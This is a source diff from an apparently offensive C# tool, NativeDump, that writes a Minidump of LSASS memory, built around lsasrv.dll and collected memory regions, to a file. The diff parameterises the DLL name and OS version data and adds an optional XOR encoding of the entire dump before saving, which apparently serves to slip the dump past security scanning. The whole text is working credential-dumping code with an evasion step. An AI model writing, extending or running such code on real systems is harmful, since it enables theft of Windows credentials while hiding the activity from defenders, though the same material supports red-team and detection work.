@@ -1,8 +1,8 @@
 ﻿using System;
 using System.IO;
+using System.Linq;
 using System.Collections.Generic;
 using System.Runtime.InteropServices;
-using System.Linq;
 using static NativeDump.Win32;
 
 
@@ -28,15 +28,7 @@ namespace NativeDump
         }
 
 
-        public static OSVERSIONINFOEX getBuildNumber() {
-            OSVERSIONINFOEX osVersionInfo = new OSVERSIONINFOEX();
-            osVersionInfo.dwOSVersionInfoSize = Marshal.SizeOf(typeof(OSVERSIONINFOEX));
-            RtlGetVersion(ref osVersionInfo);
-            return osVersionInfo;
-        }
-
-
-        public static void CreateMinidump(IntPtr lsasrvdll_address, int lsasrvdll_size, List<Memory64Info> mem64info_List, byte[] memoryRegions_byte_arr, string dumpfile)
+        public static void CreateMinidump(IntPtr lsasrvdll_address, int lsasrvdll_size, string lsasrv_name, List<Memory64Info> mem64info_List, byte[] memoryRegions_byte_arr, string dumpfile, OSVERSIONINFOEX osVersionInfo, bool xor_bytes, byte xor_byte)
         {            
             // Header
             MinidumpHeader header = new MinidumpHeader();
@@ -62,7 +54,6 @@ namespace NativeDump
             // SystemInfoStream
             SystemInfoStream systemInfoStream = new SystemInfoStream();
             systemInfoStream.ProcessorArchitecture = 0x9;
-            OSVERSIONINFOEX osVersionInfo = getBuildNumber();
             systemInfoStream.MajorVersion = (uint)osVersionInfo.dwMajorVersion;
             systemInfoStream.MinorVersion = (uint)osVersionInfo.dwMinorVersion;
             systemInfoStream.BuildNumber = (uint)osVersionInfo.dwBuildNumber;
@@ -74,7 +65,7 @@ namespace NativeDump
             moduleListStream.Size = (uint)lsasrvdll_size;
             moduleListStream.PointerName = 0xE8;
             // ModuleList - Unicode string
-            string dll_str = "C:\\Windows\\System32\\lsasrv.dll";    
+            string dll_str = "C:\\Windows\\System32\\" + lsasrv_name;    
             CUSTOM_UNICODE_STRING dllName = new CUSTOM_UNICODE_STRING();
             dllName.Length = (uint)(dll_str.Length * 2);
             dllName.Buffer = dll_str;
@@ -98,6 +89,15 @@ namespace NativeDump
             byte[] systemInfoStream_byte_arr = StructToByteArray(systemInfoStream);
             byte[] moduleListStream_byte_arr = JoinByteArrays(StructToByteArray(moduleListStream), StructToByteArray(dllName));
             byte[] minidumpFile = JoinByteArrays(header_byte_arr, streamDirectory_byte_arr, systemInfoStream_byte_arr, moduleListStream_byte_arr, memory64ListStream_byte_arr, memoryRegions_byte_arr);
+
+            // Encoding
+            if (xor_bytes)
+            {
+                for (int i = 0; i < minidumpFile.Length; i++)
+                {
+                    minidumpFile[i] = (byte)(minidumpFile[i] ^ xor_byte);
+                }
+            }
 
             // Save to file
             try
